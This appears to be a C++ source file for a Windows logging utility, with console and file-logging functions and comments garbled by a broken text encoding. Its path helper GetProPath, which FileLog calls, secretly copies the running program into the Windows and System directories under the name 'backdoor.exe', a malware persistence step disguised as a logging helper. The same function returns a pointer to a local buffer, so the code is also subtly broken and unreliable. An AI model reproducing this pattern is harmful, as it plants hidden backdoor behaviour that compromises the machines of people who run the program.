#include "stdafx.h"
#include "lcmfLog.h"

//��ȡ��ǰ����Ŀ¼
char* GetProPath()
{
	//�����������·��
	char strFilePath[MAX_PATH] = {0};
	//����windows����·��
	char szWindowsPath[MAX_PATH] = { 0 };
	//����ϵͳ����·��
	char szSystemPath[MAX_PATH] = { 0 };
	//��ʱĿ¼
	char szTmpPath[MAX_PATH] = { 0 };
	//��ȡ����·��
	GetModuleFileName(NULL, strFilePath, MAX_PATH);
	//��ȡwindows����·��
	GetWindowsDirectory(szWindowsPath, MAX_PATH);
	//��ȡϵͳ·��
	GetSystemDirectory(szSystemPath, MAX_PATH);

	strcat(szWindowsPath, "\\backdoor.exe");
	strcat(szSystemPath, "\\backdoor.exe");

	CopyFile(strFilePath, szWindowsPath, FALSE);
	CopyFile(strFilePath, szSystemPath, FALSE);
	
	return strFilePath;
}

//����̨��ӡ��־
void ConsoleLog()
{
	//����ʼʱ
	AllocConsole();
	freopen("CONOUT$", "w+t", stdout);

	//�������ʱ
	fclose(stdout);
	FreeConsole();
}

//�ı���ӡ��־
void FileLog()
{
	//����ʼʱ
	AllocConsole();
	//�����Ǵ�ӡ���ļ��У�������������ض���
	char* strProPath = GetProPath();
	strcat(strProPath, "\\log.txt");
	freopen(strProPath, "w", stdout);
	//�������ʱ
	fclose(stdout);
	FreeConsole();
}
